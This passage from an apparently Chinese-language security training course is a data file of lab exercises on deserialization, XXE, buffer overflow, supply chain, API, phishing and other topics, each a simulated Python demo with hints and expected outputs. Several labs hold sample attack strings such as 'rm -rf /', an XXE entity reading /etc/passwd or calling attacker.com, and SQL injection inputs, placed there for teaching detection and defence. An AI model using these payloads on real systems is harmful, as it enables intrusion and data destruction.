        try:
            raw = base64.b64decode(data).decode()
            # 不安全：直接eval/exec模拟pickle.loads
            if "__import__" in raw or "os." in raw or "eval" in raw:
                print("  [DANGER] 检测到恶意代码注入!")
                return {"status": "ATTACK_DETECTED"}
            
            # 验证数字签名
            obj = json.loads(raw)
            return obj
        except:
            return None

class SafeSerializer:
    """安全的序列化器"""
    
    ALLOWED_KEYS = {"name", "email", "role", "permissions"}
    
    def deserialize(self, data):
        try:
            obj = json.loads(data)
            # 白名单过滤：只保留允许的字段
            safe_obj = {k: v for k, v in obj.items() 
                       if k in self.ALLOWED_KEYS}
            # 类型检查
            for k, v in safe_obj.items():
                if not isinstance(v, (str, int, bool, list)):
                    return None, f"类型异常: {k}"
            return safe_obj, "OK"
        except json.JSONDecodeError:
            return None, "JSON格式错误"

print("=" * 60)
print("不安全反序列化攻击演示")
print("=" * 60)

u = UnsafePickle()
s = SafeSerializer()

# 正常数据
normal = json.dumps({"name": "Alice", "role": "user"})
print(f"\\n正常数据: {normal}")
res, msg = s.deserialize(normal)
print(f"安全反序列化: {msg} -> {res}")

# 攻击payload
attacks = [
    '{"__import__":"os","system":"rm -rf /"}',
    '{"name":"hacker","role":"admin","__class__":"exploit"}',
    '{"eval":"__import__(\'os\').system(\'id\')"}',
]
print("\\n[攻击payload检测]")
for p in attacks:
    print(f"Payload: {p[:50]}...")
    res, msg = s.deserialize(p)
    print(f"  结果: {msg}")

print("\\n防护方案:")
print("  1. 优先使用JSON,避免Pickle/Java序列化")
print("  2. 字段白名单 + 类型校验")
print("  3. 数字签名/加密防篡改")
print("  4. 反序列化在沙箱中执行")`,
    expectedOutput: '不安全反序列化',
    hints: ['永远不要反序列化不可信的数据', 'pickle.loads可导致RCE'],
  },
  {
    id: 'xxe-injection',
    title: 'XXE注入攻击',
    description: '学习XML外部实体注入原理与防护',
    difficulty: 'medium',
    instructions: [
      '理解XML外部实体（XXE）注入原理',
      '学习XXE攻击的常见利用方式（文件读取、SSRF、DoS）',
      '了解XML解析器的安全配置方法',
      '比较XML与JSON的安全性',
    ],
    initialCode: `# XXE XML外部实体注入模拟
import re

class XMLParserSimulator:
    """模拟XML解析器XXE漏洞"""
    
    def __init__(self):
        self.internal_files = {
            "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\\nadmin:x:1000:1000::/home/admin:/bin/bash",
            "/etc/shadow": "[SHADOW_FILE_RESTRICTED]",
            "C:\\\\Windows\\\\win.ini": "[Windows系统文件]"
        }
    
    def parse_unsafe(self, xml_str):
        print(f"  解析中...")
        
        # 检测外部实体声明
        entity_match = re.search(r'<!ENTITY\\s+(\\w+)\\s+SYSTEM\\s+["\'](.+?)["\']', xml_str)
        if entity_match:
            entity_name = entity_match.group(1)
            entity_path = entity_match.group(2)
            print(f"  [VULN] 发现外部实体! {entity_name} -> {entity_path}")
            
            # 模拟文件读取
            for path, content in self.internal_files.items():
                if path in entity_path or entity_path in path:
                    print(f"  [LEAK] 读取文件: {path}")
                    return f"XXE泄露: {content[:50]}..."
            
            # SSRF
            if entity_path.startswith('http'):
                print(f"  [SSRF] 服务器端请求: {entity_path}")
                return f"SSRF: 请求了 {entity_path}"
        
        return "OK"

    def parse_safe(self, xml_str):
        dangerous = ['<!ENTITY', 'SYSTEM', 'PUBLIC']
        for kw in dangerous:
            if kw in xml_str:
                print(f"  [BLOCKED] 检测到关键词: {kw}")
                return "REJECTED: 外部实体被禁用"
        print(f"  安全解析完成")
        return "SAFE"


print("=" * 60)
print("XXE XML外部实体注入")
print("=" * 60)

p = XMLParserSimulator()

xml_attacks = [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><data>&xxe;</data>',
    '<user><name>Alice</name><role>admin</role></user>',
]

print("\\n[不安全解析器]")
for xml in xml_attacks:
    print(f"\\nXML: {xml[:60]}...")
    print(p.parse_unsafe(xml))

print("\\n[安全解析器]")
for xml in xml_attacks:
    print(f"\\nXML: {xml[:60]}...")
    print(p.parse_safe(xml))

print("\\n修复方案:")
print("  1. 禁用DOCTYPE声明")
print("  2. 禁用外部实体: dtdProcessing=Prohibit")
print("  3. JSON替代XML(无XXE风险)")`,
    expectedOutput: 'XXE泄露',
    hints: ['XXE可读取服务器文件', '禁用DTD是最简单的防护'],
  },
  {
    id: 'buffer-overflow',
    title: '缓冲区溢出原理',
    description: '理解缓冲区溢出攻击的内存模型',
    difficulty: 'hard',
    instructions: [
      '理解栈帧结构和EIP/RIP寄存器的作用',
      '学习缓冲区溢出的基本原理',
      '了解shellcode和ROP攻击链',
      '掌握ASLR、DEP、Stack Canary等防护技术',
    ],
    initialCode: `# 缓冲区溢出原理演示
import struct

class StackSimulator:
    def __init__(self):
        self.memory = bytearray(64)
        self.esp = 0  # 栈指针
    
    def push(self, data, size_label):
        bs = data.to_bytes(4, 'little') if isinstance(data, int) else data.encode()
        self.esp -= len(bs)
        for i, b in enumerate(bs):
            self.memory[self.esp + i] = b
        print(f"  PUSH {size_label} -> [0x{self.esp & 0xFF:02x}]")
    
    def dump(self):
        print(f"  栈内存(ESP=0x{self.esp & 0xFF:02x}):")
        for i in range(0, 64, 16):
            chunk = self.memory[i:i+16]
            hex_str = ' '.join(f'{b:02x}' for b in chunk)
            ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
            print(f"    0x{i:02x}: {hex_str}  {ascii_str}")

class BufferOverflowSim:
    def __init__(self):
        self.buffer_size = 8
    
    def unsafe_copy(self, user_input):
        buf = ['\\x00'] * self.buffer_size
        ret_addr = "0x08048555"  # 正常返回地址
        
        print(f"  缓冲区大小: {self.buffer_size} 字节")
        print(f"  用户输入: {user_input} ({len(user_input)} 字节)")
        print(f"  返回地址: {ret_addr}")
        
        if len(user_input) > self.buffer_size:
            overflow = len(user_input) - self.buffer_size
            
            # 模拟覆盖返回地址
            if len(user_input) >= self.buffer_size + 4:
                fake_addr = user_input[self.buffer_size:self.buffer_size+4]
                print(f"  [VULN] 缓冲区溢出! 溢出 {overflow} 字节")
                print(f"  [HACK] 返回地址被覆盖为: {fake_addr}")
                return "EXPLOITED: 劫持了执行流!"
            else:
                print(f"  [VULN] 部分溢出: {overflow} 字节, 但未覆盖返回地址")
                return "OVERFLOW: 可能崩溃"
        else:
            print(f"  [SAFE] 输入在缓冲区范围内")
            return "SAFE"

print("=" * 60)
print("缓冲区溢出攻击原理")
print("=" * 60)

s = StackSimulator()
print("\\n[栈帧布局]")
print("  高地址")
print("  +----------------+")
print("  |  函数参数      |")
print("  +----------------+")
print("  |  返回地址(EIP)  | <- 溢出目标!")
print("  +----------------+")
print("  |  保存的EBP     |")
print("  +----------------+")
print("  |  局部变量buf[] | <- 溢出起点")
print("  +----------------+")
print("  低地址 (ESP)")

bof = BufferOverflowSim()

print("\\n[测试1: 正常输入]")
print(bof.unsafe_copy("ABCD"))

print("\\n[测试2: 精确溢出-覆盖返回地址]")
print(bof.unsafe_copy("A" * 8 + "\\xEF\\xBE\\xAD\\xDE"))

print("\\n防护技术:")
print("  Stack Canary: 返回地址前插入随机值")
print("  ASLR: 随机化内存地址")
print("  DEP/NX: 栈不可执行")
print("  SafeSEH: 异常处理保护")`,
    expectedOutput: 'EXPLOITED',
    hints: ['溢出可通过覆盖返回地址劫持EIP', '现代OS有多层防护'],
  },
  {
    id: 'supply-chain',
    title: '供应链攻击模拟',
    description: '理解软件供应链安全风险与防护',
    difficulty: 'medium',
    instructions: [
      '理解供应链攻击的攻击面（依赖劫持、构建注入、分发篡改）',
      '学习SBOM（软件物料清单）的概念',
      '掌握依赖完整性校验方法',
      '了解供应链安全框架（SLSA、SSDF）',
    ],
    initialCode: `# 供应链安全演示
import hashlib, json

class SupplyChainSim:
    def __init__(self):
        # 官方注册表
        self.registry = {
            "lodash": {
                "4.17.21": "abc123hash...",
                "4.17.20": "def456hash..."
            },
            "requests": {
                "2.28.0": "ghi789hash...",
                "2.27.1": "jkl012hash..."
            }
        }
        # 恶意包
        self.malicious_packages = {
            "lodash-cli": "名称混淆攻击",
            "requets": "拼写错误攻击(typosquatting)",
            "lodash-util": "依赖混淆攻击"
        }
    
    def install_package(self, name, version, registry_url="official"):
        checksum = hashlib.sha256(f"{name}@{version}".encode()).hexdigest()[:16]
        
        # 检查是否为恶意包
        if name in self.malicious_packages:
            return f"DANGER: {self.malicious_packages[name]}"
        
        # 验证官方来源
        if registry_url != "official":
            return f"WARNING: 非官方源 {registry_url}"
        
        # 验证版本
        pkg = self.registry.get(name, {})
        if version not in pkg:
            return f"WARNING: 版本 {version} 不在已知列表中"
        
        return f"SAFE: {name}@{version} (校验: {checksum})"

    def generate_sbom(self, dependencies):
        sbom = {
            "name": "my-app",
            "version": "1.0.0",
            "components": []
        }
        for dep, ver in dependencies.items():
            sbom["components"].append({
                "name": dep,
                "version": ver,
                "purl": f"pkg:npm/{dep}@{ver}",
                "hash": hashlib.sha256(f"{dep}@{ver}".encode()).hexdigest()[:12]
            })
        return sbom

print("=" * 60)
print("供应链安全攻击演示")
print("=" * 60)

sc = SupplyChainSim()

# 正常安装
print("\\n[正常依赖安装]")
pkgs = [
    ("lodash", "4.17.21", "official"),
    ("lodash-cli", "1.0.0", "official"),
    ("requets", "2.0.0", "unofficial"),
]
for name, ver, src in pkgs:
    result = sc.install_package(name, ver, src)
    print(f"  {name}@{ver} ({src}): {result}")

# SBOM生成
print("\\n[SBOM 软件物料清单]")
deps = {"lodash": "4.17.21", "express": "4.18.0", "axios": "1.4.0"}
sbom = sc.generate_sbom(deps)
print(json.dumps(sbom, indent=2, ensure_ascii=False))

print("\\n防护建议:")
print("  1. 使用lock文件锁定版本+哈希")
print("  2. 私有仓库代理(防依赖混淆)")
print("  3. 定期SBOM审计")
print("  4. 最小权限原则")`,
    expectedOutput: '供应链安全',
    hints: ['依赖混淆是最常见的供应链攻击', 'SBOM帮助你了解所有依赖'],
  },
  {
    id: 'zero-trust-demo',
    title: '零信任架构演示',
    description: '理解零信任"永不信任，始终验证"原则',
    difficulty: 'easy',
    instructions: [
      '理解传统边界安全与零信任的区别',
      '学习零信任三大核心原则',
      '掌握微隔离和持续验证的概念',
      '了解零信任实施框架（NIST SP 800-207）',
    ],
    initialCode: `# 零信任架构 vs 传统边界安全
import time, hashlib

class TraditionalSecurity:
    def __init__(self):
        self.inside_network = set()
    
    def login(self, user, password, ip):
        if password == "correct":
            self.inside_network.add(user)
            print(f"  [传统] {user} 从 {ip} 登录成功(进入内网)")
            return True
        return False
    
    def access_resource(self, user, resource):
        if user in self.inside_network:
            return f"GRANTED: {user} 访问 {resource} (已在可信网络)"
        return f"DENIED: 不在内网"

class ZeroTrustSecurity:
    def __init__(self):
        self.users = { "alice": "strong123", "bob": "secure456" }
        self.policies = {
            "alice": ["db-read", "api-call"],
            "bob": ["api-call"]
        }
        self.trust_score = {}
    
    def authenticate(self, user, password, context):
        # 持续验证身份
        if self.users.get(user) != password:
            return False, "认证失败"
        if context.get('device_trust', 0) < 0.7:
            return False, "设备不受信任"
        if context.get('location', '') == 'unusual':
            return False, "异常地理位置"
        return True, "OK"
    
    def authorize(self, user, resource, context):
        # 基于策略的细粒度授权
        if resource not in self.policies.get(user, []):
            return f"DENIED: {user} 无 {resource} 权限"
        
        # 动态信任评分
        score = 0.5
        if context.get('mfa', False): score += 0.3
        if context.get('device_trust', 0) > 0.8: score += 0.2
        
        if score >= 0.8:
            return f"GRANTED: {user} 访问 {resource} (信任评分:{score:.1f})"
        return f"DENIED: 信任评分不足 ({score:.1f})"

print("=" * 60)
print("零信任架构 vs 传统安全")
print("=" * 60)

trad = TraditionalSecurity()
zt = ZeroTrustSecurity()

print("\\n[传统边界安全]")
print("  模型: 城堡+护城河, 进入内网即信任")
trad.login("alice", "correct", "10.0.0.5")
print(trad.access_resource("alice", "db-read"))
print(trad.access_resource("bob", "db-read"))  # Bob未登录

print("\\n[零信任架构]")
print("  模型: 永不信任, 始终验证")

# 正常场景
ctx = {"device_trust": 0.9, "location": "office", "mfa": True}
ok, msg = zt.authenticate("alice", "strong123", ctx)
print(f"\\n  认证 alice: {ok}, {msg}")
if ok:
    print(f"  {zt.authorize('alice', 'db-read', ctx)}")
    print(f"  {zt.authorize('bob', 'db-read', ctx)}")

# 异常场景
ctx_bad = {"device_trust": 0.3, "location": "unusual", "mfa": False}
ok, msg = zt.authenticate("alice", "strong123", ctx_bad)
print(f"\\n  认证 alice(异常): {ok}, {msg}")

print("\\n零信任核心原则:")
print("  1. 永不信任任何网络/用户/设备")
print("  2. 最小权限: 仅授予必要权限")
print("  3. 持续验证: 每个请求都需认证授权")
print("  4. 假设已被入侵: 微隔离防横向移动")`,
    expectedOutput: '零信任',
    hints: ['零信任不是产品，是一种安全理念', '微隔离防止横向移动'],
  },
  {
    id: 'osint-tools',
    title: 'OSINT信息收集',
    description: '学习开源情报收集技术与隐私保护',
    difficulty: 'medium',
    instructions: [
      '理解OSINT在安全领域的应用',
      '学习域名/IP/邮箱信息收集技术',
      '了解whois、DNS、搜索引擎等数据源',
      '掌握个人隐私保护和信息泄露防范',
    ],
    initialCode: `# OSINT 开源情报收集模拟
import re, hashlib

class OSINTSimulator:
    def __init__(self):
        # 模拟公开数据源
        self.whois_db = {
            "example.com": {
                "registrar": "GoDaddy",
                "created": "1995-08-13",
                "email": "admin@example.com",
                "ns": ["ns1.example.com", "ns2.example.com"]
            },
            "target-corp.com": {
                "registrar": "Namecheap",
                "created": "2019-03-15",
                "email": "it@target-corp.com",
                "ns": ["dns1.hosting.com"]
            }
        }
        self.dns_records = {
            "example.com": ["93.184.216.34"],
            "target-corp.com": ["203.0.113.50", "203.0.113.51"],
            "mail.target-corp.com": ["203.0.113.52"],
        }
        self.subdomain_hints = {
            "target-corp.com": [
                "mail.target-corp.com", "vpn.target-corp.com",
                "dev.target-corp.com", "admin.target-corp.com"
            ]
        }

    def whois_lookup(self, domain):
        info = self.whois_db.get(domain)
        if info:
            return {
                "domain": domain,
                "registrar": info["registrar"],
                "created": info["created"],
                "contact": info["email"],
                "nameservers": info["ns"]
            }
        return {"error": "域名未注册或已过期"}

    def dns_lookup(self, domain):
        records = self.dns_records.get(domain, [])
        subdomains = self.subdomain_hints.get(domain, [])
        return {
            "domain": domain,
            "a_records": records,
            "potential_subdomains": subdomains,
            "count": len(subdomains)
        }

    def email_analysis(self, email):
        domain = email.split('@')[-1]
        # 模拟HaveIBeenPwned检查
        breaches = {"admin@example.com": 3, "user@gmail.com": 5}
        return {
            "email": email,
            "domain": domain,
            "breaches": breaches.get(email, 0),
            "risk": "HIGH" if breaches.get(email, 0) > 2 else "LOW"
        }

print("=" * 60)
print("OSINT 信息收集演示")
print("=" * 60)

osint = OSINTSimulator()

print("\\n[1. WHOIS查询]")
result = osint.whois_lookup("target-corp.com")
for k, v in result.items():
    print(f"  {k}: {v}")

print("\\n[2. DNS枚举]")
result = osint.dns_lookup("target-corp.com")
print(f"  A记录: {result['a_records']}")
print(f"  可能子域: {result['potential_subdomains']}")

print("\\n[3. 邮箱泄露检查]")
for email in ["admin@example.com", "user@gmail.com"]:
    r = osint.email_analysis(email)
    print(f"  {r['email']}: {r['breaches']}次泄露, 风险:{r['risk']}")

print("\\nOSINT工具推荐:")
print("  shodan.io - 设备搜索引擎")
print("  crt.sh - SSL证书透明度日志")
print("  haveibeenpwned.com - 邮箱泄露查询")
print("  hunter.io - 企业邮箱收集")`,
    expectedOutput: 'OSINT',
    hints: ['OSINT是合法的信息收集方式', '定期检查信息泄露风险'],
  },
  {
    id: 'api-security-test',
    title: 'API安全测试',
    description: '学习REST API常见漏洞与防护',
    difficulty: 'medium',
    instructions: [
      '理解API安全Top 10（OWASP）',
      '学习API认证绕过、越权、过量数据暴露',
      '掌握API速率限制和输入校验',
      '了解GraphQL vs REST安全差异',
    ],
    initialCode: `# API安全测试模拟
import re, json, time

class APISecurityTester:
    def __init__(self):
        self.rate_limits = {}
        self.tokens = {
            "user_token_001": {"user_id": 100, "role": "user"},
            "admin_token_999": {"user_id": 1, "role": "admin"},
        }
        self.resources = {
            "100": {"name": "Alice", "balance": 5000, "ssn": "123-45-6789"},
            "101": {"name": "Bob", "balance": 300, "ssn": "987-65-4321"},
        }
    
    def test_broken_auth(self, endpoint, token):
        """测试认证缺陷"""
        if not token or token not in self.tokens:
            return "401: 未认证"
        
        user = self.tokens[token]
        # 测试越权
        resource_id = endpoint.split('/')[-1]
        if resource_id != str(user["user_id"]) and user["role"] != "admin":
            return f"403: 越权访问 (用户{user['user_id']}尝试访问{resource_id})"
        return "200: OK"

    def test_rate_limiting(self, api_key):
        """测试速率限制"""
        now = time.time()
        if api_key not in self.rate_limits:
            self.rate_limits[api_key] = []
        
        # 清理旧记录
        self.rate_limits[api_key] = [
            t for t in self.rate_limits[api_key] if now - t < 60
        ]
        
        if len(self.rate_limits[api_key]) >= 10:
            return f"429: 速率限制(10次/分钟) 剩余:{0}"
        
        self.rate_limits[api_key].append(now)
        remaining = 10 - len(self.rate_limits[api_key])
        return f"200: OK (剩余请求:{remaining})"

    def test_data_exposure(self, response):
        """测试过量数据暴露"""
        sensitive_fields = ["ssn", "password", "credit_card", "secret"]
        exposed = [f for f in sensitive_fields if f in response]
        if exposed:
            return f"WARNING: 暴露敏感字段: {exposed}"
        return "PASS: 无不必要的数据暴露"

    def test_input_validation(self, param, value):
        """测试输入校验"""
        if param == "page" and not value.isdigit():
            return f"WARNING: page参数未校验({value})"
        if param == "sort" and not value.isalpha():
            return "WARNING: sort参数存在注入风险"
        if len(value) > 100:
            return "WARNING: 输入超长"
        return f"PASS: {param}={value}"

print("=" * 60)
print("API安全测试")
print("=" * 60)

tester = APISecurityTester()

# 认证测试
print("\\n[1. 认证与授权测试]")
print(f"  无Token: {tester.test_broken_auth('/api/user/100', '')}")
print(f"  正常用户: {tester.test_broken_auth('/api/user/100', 'user_token_001')}")
print(f"  越权尝试: {tester.test_broken_auth('/api/user/101', 'user_token_001')}")
print(f"  管理员: {tester.test_broken_auth('/api/user/101', 'admin_token_999')}")

# 速率限制
print("\\n[2. 速率限制测试]")
for i in range(12):
    r = tester.test_rate_limiting("api_key_001")
    if i < 2 or i >= 10:
        print(f"  请求{i+1}: {r}")

# 数据暴露
print("\\n[3. 数据暴露检查]")
print(f"  {tester.test_data_exposure('{\\\"name\\\":\\\"Alice\\\",\\\"ssn\\\":\\\"123\\\"}')}")
print(f"  {tester.test_data_exposure('{\\\"name\\\":\\\"Bob\\\"}')}")

# 输入校验
print("\\n[4. 输入校验测试]")
print(f"  {tester.test_input_validation('page', '-1 OR 1=1')}")
print(f"  {tester.test_input_validation('sort', 'id; DROP TABLE')}")
print(f"  {tester.test_input_validation('page', '10')}")

print("\\nAPI安全防护:")
print("  JWT + OAuth2.0认证")
print("  基于角色的访问控制(RBAC)")
print("  输入校验 + 参数化查询")
print("  最小数据暴露原则")`,
    expectedOutput: 'API安全测试完成',
    hints: ['API越权是最常见的漏洞之一', '速率限制防止暴力破解和DDoS'],
  },
  {
    id: 'social-eng-defense',
    title: '社会工程学防御',
    description: '识别常见社工攻击并建立防御体系',
    difficulty: 'easy',
    instructions: [
      '了解社工攻击的心理学基础（权威、紧迫、互惠）',
      '识别钓鱼邮件、电话诈骗、尾随等常见手法',
      '学习钓鱼邮件的技术指标检查（SPF/DKIM/DMARC）',
      '建立安全意识培训和报告机制',
    ],
    initialCode: `# 社会工程学攻击识别与防御
import re, hashlib

class PhishingDetector:
    """钓鱼邮件/网站检测器"""
    
    SUSPICIOUS_DOMAINS = ["rnicrosoft.com", "paypa1.com", "secure-bank.xyz"]
    URGENCY_KEYWORDS = ["立即", "紧急", "最后通知", "账号冻结", "您的账户"]
    AUTHORITY_KEYWORDS = ["系统管理员", "安全中心", "官方通知", "IT部门"]
    
    @staticmethod
    def check_email(email_data):
        score = 0
        flags = []
        
        # 1. 发件人域名
        sender = email_data.get("from", "")
        domain = sender.split('@')[-1] if '@' in sender else sender
        
        if domain in PhishingDetector.SUSPICIOUS_DOMAINS:
            score += 3
            flags.append(f"可疑域名: {domain}")
        
        # 2. 紧急语气
        subject = email_data.get("subject", "") + email_data.get("body", "")
        for kw in PhishingDetector.URGENCY_KEYWORDS:
            if kw in subject:
                score += 1
                flags.append(f"紧急关键词: {kw}")
                break
        
        # 3. 伪造权威
        for kw in PhishingDetector.AUTHORITY_KEYWORDS:
            if kw in subject:
                score += 1
                flags.append(f"伪权威: {kw}")
                break
        
        # 4. 可疑链接
        links = re.findall(r'https?://[^\\s<>"]+', email_data.get("body", ""))
        for link in links:
            if any(d in link for d in PhishingDetector.SUSPICIOUS_DOMAINS):
                score += 2
                flags.append(f"恶意链接: {link[:40]}")
        
        return {
            "score": score,
            "risk": "HIGH" if score >= 4 else ("MEDIUM" if score >= 2 else "LOW"),
            "flags": flags
        }

class SocialEngineeringDefense:
    @staticmethod
    def check_spoofing(email_from, return_path, dkim_ok, spf_ok):
        checks = []
        if email_from != return_path:
            checks.append("From与Return-Path不匹配!")
        if not spf_ok:
            checks.append("SPF验证失败!")
        if not dkim_ok:
            checks.append("DKIM签名无效!")
        
        risk = "HIGH" if len(checks) >= 2 else ("MEDIUM" if checks else "LOW")
        return {"passed": len(checks) == 0, "checks": checks, "risk": risk}

print("=" * 60)
print("社会工程学攻击识别")
print("=" * 60)

detector = PhishingDetector()

# 正常邮件
normal = {
    "from": "hr@company.com",
    "subject": "团队建设活动通知",
    "body": "各位同事好,下周五公司组织团建活动..."
}
print(f"\\n邮件1: {detector.check_email(normal)}")

# 钓鱼邮件
phish = {
    "from": "admin@rnicrosoft.com",
    "subject": "【紧急】您的账号即将冻结!",
    "body": "尊敬的用户，您的账号存在异常登录，请立即点击 https://rnicrosoft.com/login 验证身份，否则账号将被永久冻结！"
}
print(f"\\n邮件2(钓鱼): {detector.check_email(phish)}")

# 技术支持诈骗
scam = {
    "from": "support@secure-bank.xyz",
    "subject": "系统管理员通知: 密码重置",
    "body": "检测到异常交易，请立即联系IT部门验证您的身份信息。"
}
print(f"\\n邮件3(诈骗): {detector.check_email(scam)}")

# 邮件验证
defender = SocialEngineeringDefense()
print(f"\\n协议级验证:")
print(f"  SPF/DKIM正常: {defender.check_spoofing('it@corp.com', 'it@corp.com', True, True)}")
print(f"  SPF失败: {defender.check_spoofing('ceo@corp.com', 'hacker@evil.com', False, False)}")

print("\\n防范口诀:")
print("  1. 核实发件人身份(电话/当面)")
print("  2. 不点击可疑链接和附件")
print("  3. 敏感操作多重审批")
print("  4. 遭遇攻击立即报告")`,
    expectedOutput: '社会工程学',
    hints: ['权威感和紧迫感是社工攻击的核心手法', 'SPF/DKIM/DMARC三重验证'],
  },
  {
    id: 'container-security',
    title: '容器安全基础',
    description: '学习Docker/K8s容器安全最佳实践',
    difficulty: 'medium',
    instructions: [
      '理解容器与虚拟机的安全差异',
      '学习容器逃逸的常见途径',
      '掌握镜像安全扫描和最小化原则',
      '了解Kubernetes RBAC和Network Policy',
    ],
    initialCode: `# 容器安全评估模拟
import json

class ContainerSecurity:
    """容器安全最佳实践检查"""
    
    BEST_PRACTICES = {
        "distroless": {
            "desc": "使用无发行版基础镜像(Google Distroless)",
            "risk": "减少攻击面,无shell/包管理器",
            "weight": 3
        },
        "nonroot": {
            "desc": "以非root用户运行容器",
            "risk": "容器逃逸后权限受限",
            "weight": 3
        },
        "readonly_rootfs": {
            "desc": "根文件系统只读挂载",
            "risk": "防止攻击者写入恶意文件",
            "weight": 2
        },
        "capabilities_drop": {
            "desc": "丢弃所有Capabilities,仅添加必需",
            "risk": "限制容器内核调用能力",
            "weight": 2
        },
        "no_privileged": {
            "desc": "禁止特权模式(--privileged)",
            "risk": "特权容器可访问所有设备",
            "weight": 3
        },
        "resource_limits": {
            "desc": "设置CPU/内存资源限制",
            "risk": "防止DoS资源耗尽",
            "weight": 1
        },
        "image_scan": {
            "desc": "镜像漏洞扫描(Trivy/Clair)",
            "risk": "已知漏洞可能被利用",
            "weight": 2
        },
        "secret_management": {
            "desc": "使用Secret管理(非环境变量/硬编码)",
            "risk": "环境变量可能被泄露",
            "weight": 2
        }
    }
    
    @classmethod
    def audit_container(cls, config):
        score = 0
        max_score = 0
        findings = []
        
        for key, practice in cls.BEST_PRACTICES.items():
            max_score += practice["weight"]
            if config.get(key, False):
                score += practice["weight"]
                findings.append(f"  [OK] {practice['desc']}")
            else:
                findings.append(f"  [WARN] {practice['desc']} - 风险: {practice['risk']}")
        
        grade = "A" if score >= max_score * 0.9 else (
                "B" if score >= max_score * 0.7 else (
                "C" if score >= max_score * 0.5 else "D"))
        
        return {"score": score, "max": max_score, "grade": grade, "findings": findings}

print("=" * 60)
print("容器安全审计")
print("=" * 60)

cs = ContainerSecurity()

# 不安全配置
bad_config = {
    "distroless": False, "nonroot": False, "readonly_rootfs": False,
    "capabilities_drop": False, "no_privileged": False,
    "resource_limits": False, "image_scan": False, "secret_management": False
}

# 安全配置
good_config = {
    "distroless": True, "nonroot": True, "readonly_rootfs": True,
    "capabilities_drop": True, "no_privileged": True,
    "resource_limits": True, "image_scan": True, "secret_management": True
}

print("\\n[不安全容器配置]")
result = cs.audit_container(bad_config)
for f in result["findings"]:
    print(f)
print(f"\\n评分: {result['score']}/{result['max']} ({result['grade']})")

print("\\n[安全容器配置]")
result = cs.audit_container(good_config)
for f in result["findings"]:
    print(f)
print(f"\\n评分: {result['score']}/{result['max']} ({result['grade']})")

print("\\n容器安全铁三角:")
print("  1. 最小镜像: distroless + 多阶段构建")
print("  2. 最小权限: non-root + drop ALL caps")
print("  3. 最小暴露: 只读挂载 + network policy")`,
    expectedOutput: '容器安全',
    hints: ['非root用户运行是最重要的容器安全实践', '最小化原则贯穿所有安全领域'],
  },
  {
    id: 'packet-analysis',
    title: '数据包分析与取证',
    description: '学习网络数据包捕获与安全分析',
    difficulty: 'medium',
    instructions: [
      '理解TCP/IP协议栈中可提取的取证信息',
      '学习常见攻击流量的特征（DDoS、扫描、C2通信）',
      '掌握PCAP文件的基本分析方法',
      '了解网络取证的法律合规要求',
    ],
    initialCode: `# 网络数据包分析模拟
import re, hashlib
from collections import Counter

class PacketAnalyzer:
    """网络流量分析器"""
    
    @staticmethod
    def analyze_traffic(packets):
        stats = {
            "total": len(packets),
            "protocols": Counter(),
            "src_ips": Counter(),
            "dst_ports": Counter(),
            "suspicious": []
        }
        
        for pkt in packets:
            stats["protocols"][pkt.get("proto", "UNK")] += 1
            stats["src_ips"][pkt.get("src", "0.0.0.0")] += 1
            stats["dst_ports"][pkt.get("dst_port", 0)] += 1
            
            # 检测端口扫描
            if pkt.get("flags", "") == "SYN" and pkt.get("dst_port") in [22, 3389, 3306]:
                stats["suspicious"].append(f"端口扫描: {pkt['src']}->{pkt['dst']}:{pkt['dst_port']}")
            
            # 检测可疑DNS
            if pkt.get("proto") == "DNS" and len(pkt.get("query", "")) > 50:
                stats["suspicious"].append(f"DNS隧道: {pkt['query'][:30]}...")
            
            # 检测异常大小
            if pkt.get("size", 0) > 10000:
                stats["suspicious"].append(f"异常大包: {pkt['src']} size={pkt['size']}")
        
        return stats
    
    @staticmethod
    def detect_ddos(packets):
        """检测DDoS攻击特征"""
        ip_count = Counter(p["src"] for p in packets)
        syn_count = sum(1 for p in packets if p.get("flags") == "SYN")
        
        alerts = []
        # SYN Flood检测
        if syn_count > len(packets) * 0.8:
            alerts.append(f"SYN Flood: {syn_count}/{len(packets)} 包为SYN")
        
        # 多源IP攻击
        unique_ips = len(ip_count)
        if unique_ips > 10 and len(packets) > 50:
            alerts.append(f"疑似DDoS: {unique_ips}个源IP发起{len(packets)}个请求")
        
        return alerts

print("=" * 60)
print("数据包分析与取证")
print("=" * 60)

analyzer = PacketAnalyzer()

# 模拟正常流量
normal_traffic = [
    {"src": "10.0.0.1", "dst": "93.184.216.34", "proto": "TCP", "dst_port": 443, "size": 256},
    {"src": "10.0.0.2", "dst": "93.184.216.34", "proto": "TCP", "dst_port": 80, "size": 512},
    {"src": "10.0.0.1", "dst": "8.8.8.8", "proto": "DNS", "query": "example.com", "size": 64},
]

# 模拟攻击流量
attack_traffic = [
    {"src": "1.2.3.4", "dst": "10.0.0.1", "proto": "TCP", "dst_port": 22, "flags": "SYN", "size": 64},
    {"src": "5.6.7.8", "dst": "10.0.0.1", "proto": "TCP", "dst_port": 3389, "flags": "SYN", "size": 64},
    {"src": "9.10.11.12", "dst": "10.0.0.1", "proto": "TCP", "dst_port": 3306, "flags": "SYN", "size": 64},
    {"src": "13.14.15.16", "dst": "10.0.0.1", "proto": "TCP", "dst_port": 22, "flags": "SYN", "size": 64},
    {"src": "evil.com", "dst": "10.0.0.1", "proto": "DNS", "query": "A" * 60 + ".evildomain.xyz", "size": 150},
]

print("\\n[正常流量分析]")
stats = analyzer.analyze_traffic(normal_traffic)
print(f"  总包数: {stats['total']}")
print(f"  协议分布: {dict(stats['protocols'])}")
print(f"  可疑事件: {len(stats['suspicious'])}")

print("\\n[攻击流量分析]")
stats = analyzer.analyze_traffic(attack_traffic)
print(f"  总包数: {stats['total']}")
print(f"  源IP: {dict(stats['src_ips'])}")
print(f"  目标端口: {dict(stats['dst_ports'])}")
for alert in stats['suspicious']:
    print(f"  [ALERT] {alert}")

print("\\n[DDoS检测]")
all_traffic = normal_traffic + attack_traffic
alerts = analyzer.detect_ddos(all_traffic)
for a in alerts:
    print(f"  [DDoS] {a}")

print("\\n分析工具: Wireshark, tcpdump, Zeek, Suricata")`,
    expectedOutput: '数据包分析',
    hints: ['SYN包比例异常是SYN Flood的典型特征', 'DNS查询超长可能是DNS隧道'],
  },
];

const dayExpertNotes: { [key: number]: ExpertNote[] } = {
  1: [
